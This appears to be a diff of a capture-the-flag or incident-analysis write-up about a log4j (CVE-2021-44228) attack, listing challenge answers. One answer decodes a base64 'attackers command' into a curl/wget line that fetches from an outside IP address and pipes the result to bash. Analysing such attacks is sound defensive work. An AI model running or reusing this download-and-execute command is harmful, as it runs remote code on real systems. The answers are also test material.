@@ -122,7 +122,7 @@ unfinished 2022/04
 7. `attackers command`
    * copy the base64 string, remove the hex representation if needed and convert using your favorite tool (e.g. cyberchef)
    * KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=
-   *-> (curl -s 45.155.205.233:5874/162.0.228.253:80\|\|wget -q -O- 45.155.205.233:5874/162.0.228.253:80)\|bash
+   * -> (curl -s 45.155.205.233:5874/162.0.228.253:80\|\|wget -q -O- 45.155.205.233:5874/162.0.228.253:80)\|bash
 8. `CVSS v2 score of log4j`
    * https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    * -> 9.3
